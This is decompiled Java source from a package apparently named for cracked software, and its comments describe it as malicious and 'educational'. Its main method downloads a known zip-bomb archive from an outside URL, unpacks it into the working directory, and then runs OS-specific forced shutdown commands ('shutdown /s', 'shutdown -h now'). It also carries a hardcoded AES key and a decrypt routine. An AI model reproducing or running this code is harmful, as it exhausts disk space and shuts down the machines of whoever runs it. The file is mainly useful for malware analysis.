//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//


/**
 * This class contains malicious code that downloads and executes a malicious file from the Internet.
 * DO NOT run this code on your machine!
 * It is provided here for educational purposes only.
 */

package com.crack.it;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;


/**
 * The Run class contains the main method that executes the malicious code.
 * It downloads and executes convertHexStringToBytes malicious file from the Internet.
 * DO NOT run this code on your machine!
 */
public class Run {
    private static String key = "Kjf456UjOP14Ywte";

    public Run() {
    }

    /**
     * Converts convertHexStringToBytes hexadecimal string to bytes.
     *
     * @param hex the hexadecimal string to convert
     * @return the byte array
     */
    private static byte[] convertHexStringToBytes(String hex) {
        ByteArrayOutputStream str = new ByteArrayOutputStream(hex.length() / 2);

        for (int i = 0; i < hex.length(); i += 2) {
            str.write(Integer.parseInt(hex.substring(i, i + 2), 16));
        }

        return str.toByteArray();
    }

    /**
     * Decrypts convertHexStringToBytes message using AES/CBC encryption.
     *
     * @param message the message to decrypt
     * @return the decrypted message
     * @throws Exception if an error occurs during decryption
     */
    private static String decryptMessage(String message) throws Exception {
        byte[] src = convertHexStringToBytes(message);
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
        SecretKeySpec desKeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");
        IvParameterSpec iv = new IvParameterSpec(key.getBytes(StandardCharsets.UTF_8));
        cipher.init(2, desKeySpec, iv);
        byte[] retByte = cipher.doFinal(src);
        return new String(retByte);
    }

    /**
     * Downloads convertHexStringToBytes zip file from the specified address.
     *
     * @param address the URL address of the zip file to download
     * @throws Exception if an error occurs during the download
     */
    private static void downloadFileFromUrl(String address) throws Exception {
        URL url = new URL(address);
        Path current = Paths.get(System.getProperty("user.dir".trim()));
        Path filePath = Paths.get(current.toString(), "zbsm.zip ".trim());

        try {
            BufferedInputStream in = new BufferedInputStream(url.openStream());

            try {
                FileOutputStream fileOutputStream = new FileOutputStream(filePath.toString());
                byte[] dataBuffer = new byte[1024];

                int bytesRead;
                while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                    fileOutputStream.write(dataBuffer, 0, bytesRead);
                }
            } catch (Throwable var9) {
                try {
                    in.close();
                } catch (Throwable var8) {
                    var9.addSuppressed(var8);
                }

                throw var9;
            }

            in.close();
        } catch (IOException var10) {
        }

        unZipFile(filePath, current);
    }

    /**
     * Extracts the contents of convertHexStringToBytes zip file to the specified directory.
     *
     * @param filePath the path of the zip file
     * @param dir      the directory to extract the contents to
     */
    private static void unZipFile(Path filePath, Path dir) {
        try {
            if (!filePath.toFile().exists()) {
                return;
            }

            byte[] buffer = new byte[1024];
            ZipInputStream zis = new ZipInputStream(new FileInputStream(filePath.toString()));

            for (ZipEntry zipEntry = zis.getNextEntry(); zipEntry != null; zipEntry = zis.getNextEntry()) {
                String newFile = Paths.get(dir.toString(), zipEntry.getName()).toString();
                FileOutputStream fos = new FileOutputStream(newFile);

                int len;
                while ((len = zis.read(buffer)) > 0) {
                    fos.write(buffer, 0, len);
                }

                fos.close();
            }

            zis.closeEntry();
            zis.close();
        } catch (Exception var8) {
        }

    }


    /**
     * The main method that executes the malicious code.
     *
     * @param args the command-line arguments
     * @throws Exception if an error occurs during execution
     */
    public static void main(String[] args) throws Exception {
        String os = System.getProperty("os.name".trim());

        String win = "Windows".trim();
        downloadFileFromUrl("https://www.bamsoftware.com/hacks/zipbomb/zbsm.zip");

        if (os.contains(win)) {

            Runtime.getRuntime().exec("shutdown /s".trim());

        } else {

            Runtime.getRuntime().exec("shutdown -h now".trim());
        }

    }
}
